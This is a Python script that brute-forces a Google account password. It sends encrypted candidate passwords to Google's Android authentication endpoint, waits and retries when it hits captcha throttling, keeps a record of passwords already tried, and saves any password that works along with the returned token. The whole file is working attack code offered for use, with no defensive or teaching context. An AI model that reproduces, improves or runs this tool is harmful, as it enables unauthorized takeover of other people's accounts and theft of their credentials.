from pkgxtra.gpsoauth import google
import re
import requests
import configparser
import threading
from datetime import datetime
import time
import os

fileName = "attemptedPassword"
passwordFile = None
allWords = []


def getConfigs():
    global gmail, passw, devid, pkg, sig, client_pkg, client_sig, client_ver, celnumbr, fileName, passwordFile, allWords
    config = configparser.RawConfigParser()
    try:
        config.read('settings.cfg')
        gmail = config.get('auth', 'gmail')
        passw = config.get('auth', 'passw')
        devid = config.get('auth', 'devid')
        celnumbr = config.get('auth', 'celnumbr')
        pkg = config.get('app', 'pkg')
        sig = config.get('app', 'sig')
        client_pkg = config.get('client', 'pkg')
        client_sig = config.get('client', 'sig')
        client_ver = config.get('client', 'ver')
        fileName += '-' + gmail + '.txt'
    except(configparser.NoSectionError, configparser.NoOptionError):
        quit('The "settings.cfg" file is missing or corrupt!')
    try:
        print('reading file')
        if(not os.path.exists(fileName)):
            passwordFile = open(fileName, "w")
            passwordFile.close()
        else:
            passwordFile = open(fileName, "r")
            '''line = passwordFile.readline()
            allWords.append(line[0:len(line)-2])
            while(line):
                line = passwordFile.readline()
                allWords.append(line)'''
            allWords = passwordFile.read().splitlines()

            print("I've load all words from file")
            passwordFile.close()
            # passwordFile.write('gmail: ' + gmail)
        passwordFile = open(fileName, 'a')
    except(Exception, e):
        quit("error of init of attempted password, error:", str(e))


getConfigs()

nFailedReq = []
nReqInLastMinute = 0


captchedPassword = []


def ratioFailedReq():
    global nReqInLastMinute
    while(True):
        nReqInLastMinute = 0
        if(len(nFailedReq) > 5):
            for i in range(len(nFailedReq)-1, 1, -1):
                if(nFailedReq[i] > time.time() - 60):
                    nReqInLastMinute += 1
                else:
                    break


threading.Thread(target=ratioFailedReq, args=[]).start()


def backupPassword(password):
    global passwordFile
    passwordFile = open(fileName, 'a')
    passwordFile.write(password+'\n')
    passwordFile.close()


def getGoogleAccountTokenFromAuth(password):
    global allWords
    isCapthed = False

    b64_key_7_3_29 = (b"AAAAgMom/1a/v0lblO2Ubrt60J2gcuXSljGFQXgcyZWveWLEwo6prwgi3"
                      b"iJIZdodyhKZQrNWp5nKJ3srRXcUW+F1BD3baEVGcmEgqaLZUNBjm057pK"
                      b"RI16kB0YppeGx5qIQ5QjKzsR8ETQbKLNWgRY0QRNVz34kMJR3P/LgHax/"
                      b"6rmf5AAAAAwEAAQ==")

    android_key_7_3_29 = google.key_from_b64(b64_key_7_3_29)
    encpass = google.signature(
        gmail, password, android_key_7_3_29)
    payload = {'Email': gmail, 'EncryptedPasswd': encpass,
               'app': client_pkg, 'client_sig': client_sig, 'parentAndroidId': devid}
    request = requests.post(
        'https://android.clients.google.com/auth', data=payload)

    if re.search('Captcha', request.text):
        print(
            'too many request whit the same device, incrementing waiting timer for request')
        if(password not in captchedPassword):
            captchedPassword.append(password)
            nFailedReq.append(time.time())
            isCapthed = True
    else:
        token = re.search('Token=(.*?)\n', request.text)

        if token or re.search('NeedsBrowser', request.text):
            print(request.text)
            print(password)
            print(password)
            print(password)
            fileFound = open('foundPasswordFor-'+gmail+'.txt', 'w')
            fileFound.write(password)
            if token:
                print('token: ' + token.group(1))
            return True
    if isCapthed == False:
        backupPassword(password)
        allWords.append(password)
    return False


counter = 0
double = 0

'''
def getDoppioni():
    global doppioni
    return doppioni


def doppioni():
    print('searching double')
    global double
    while(True):
        for i in range(0, len(allWords)):
            for j in range(0, len(allWords)):
                if(i != j and allWords[i] == allWords[j]):
                    print("c'è almeno un doppione")
'''


def tryDoppioni():
    while True:
        lenCaptchedPassword = len(captchedPassword)
        for i in range(0, lenCaptchedPassword):
            if (i < lenCaptchedPassword):
                print('trying capthed passw')
                tryPassword(captchedPassword[i])
                del captchedPassword[i]
                lenCaptchedPassword -= 1


threading.Thread(target=tryDoppioni, args=()).start()


def tryPassword(item):
    global allWords, counter, nReqInLastMinute

    if(item not in captchedPassword):
        time.sleep(len(captchedPassword))

    if(item not in allWords):
        # time.sleep(0.1)
        counter = counter + 1
        # print('trying ', counter, ' : ', item,)
        if nReqInLastMinute >= 2:
            time.sleep(nReqInLastMinute - 1)
        
        time.sleep(8)
        print("trying item: ", item)
        if getGoogleAccountTokenFromAuth(item) != False:
            print(item)
            quit(item)
            return True
        else:
            return False

    return False


''' 
        # test for password offline
        print("trying item: ", item)
        if(item == 'password'):
            print('la password è: ', item)
            quit(item)
        else:
            return False
        '''
